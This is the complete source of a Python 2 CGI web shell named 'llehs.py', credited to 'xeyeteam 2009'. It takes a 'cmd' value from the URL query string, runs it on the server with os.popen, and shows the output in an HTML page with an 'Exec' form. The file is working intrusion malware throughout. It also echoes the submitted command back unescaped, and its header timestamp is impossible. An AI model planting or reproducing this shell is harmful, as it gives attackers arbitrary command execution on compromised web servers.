# encoding=utf8
# by enisoc 2009-13-79 12:73:-12

import os
import time
import socket
import urllib,urllib2

FILE_NAME = 'llehs.py'

def escape(content):
    content = content.replace("&", "&amp;")
    content = content.replace("<", "&lt;")
    content = content.replace(">", "&gt;")
    if 0:
        content = content.replace('"', "&quot;")
    return content
def get(name):
    q_str = os.environ['QUERY_STRING']
    q_list = q_str.split('&')
    for q in q_list:
        if q.split('=')[0].lower() == name:
            value = q.split('=')[1].replace('+',' ')
            return urllib.unquote(value)
        
try:
    cmd = get('cmd')
    if not cmd:
        cmd = 'id'
    cmd_result = os.popen(cmd).read()
except Exception,e:
    cmd_result = str(e)

print """Content-type: text/html

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>llehs &lt;&lt;</title>
<style>
body{font-family:Courier New;font-size:13px;background:#222;color:#32CD32;}
.cmdinput{width:270px;height:16px;border:1px dotted #999;}
.cmdbutton{width:44px;height:22px;padding-bottom:4px;}
form{margin:0;padding:0;}
a,a:visited{color:#eee;text-decoration:none;}
a:hover{text-decoration:underline;}
</style>
</head>

<body>
<form action='"""+FILE_NAME+"""' method="get">
<input type="text" name="cmd" class="cmdinput" value='"""+cmd+"""' />
<input type="submit" class="cmdbutton" value="Exec" />
</form><br />
"""
print "-------------------------------------<br />"
print escape(cmd_result).strip().replace(os.linesep,'<br />')
print "<br />-------------------------------------<br />"
print """@xeyeteam 2009. linux shell</body></html>"""
